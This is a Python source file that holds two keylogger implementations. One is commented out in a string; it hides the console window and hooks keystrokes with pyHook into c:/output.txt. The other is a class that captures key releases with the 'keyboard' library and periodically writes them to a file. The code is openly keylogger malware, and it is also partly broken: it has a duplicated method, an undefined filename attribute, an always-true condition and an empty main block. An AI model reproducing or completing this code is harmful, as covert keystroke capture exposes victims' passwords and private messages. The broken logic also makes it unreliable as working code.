"""
import win32api
import win32console
import win32gui
import pythoncom, pyHook

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

def OnKeyboardEvent(event):
    if event.Ascii==5:
        _exit(1)
    if event.Ascii !=0 or 8:
         file = open('c:/output.txt', 'r+')
         buffer = file.read()
         file.close()
         
         
         file = open('c:/output.txt', 'r+')
         keylogs = chr(event.Ascii)
         if event.Ascii == 13:
             keylogs = "/n"
             buffer += keylogs
             file.write(buffer)
             file.close()
             
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent

hm.HookKeyboard()

pythoncom.PumpMessages()

 """
import keyboard
from threading import Timer
from datetime import datetime


SEND_REPORT_TIMING = 60
       

class keylogger:
    def __init__(self, interval, report_method="file"):
        self.interval = interval
        self.report_method = report_method
        
        
        self.log = ""
        
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
    
    
    def callback(self, event):
        
        name = event.name 
        
        if len(name) > 1:
            
            if name == "space":
                
                name = " "
                
            elif name == "enter":
                
                name = "[ENTER]\n"
                
            elif name == "decimal":
                
                name = "."

            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
                
        self.log += name

        def update_filename(self):
            start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":","")
            
            
    def update_filename(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
            
        print(f"[+] Saved {self.filename}.txt")
        
    
    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")


    def report(self):
        
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            
            if self.report_method == "file":
                self.report_to_file()
                print(f"[{self.filename}] - {self.log}")
                
                
            self.start_dt = datetime.now()
            
        self.log = ""
        
        timer = Timer(interval=self.interval, function=self.report)
        
        timer.daemon = True
        timer.start()
        
        
    def start(self):
        self.start_dt = datetime.now()
        
        keyboard.on_release(callback=self.callback)
        
        self.report()
        
        print(f"{datetime.now()} - Started keylogger")
        
            



if __name__ == "__main__":
    pass             
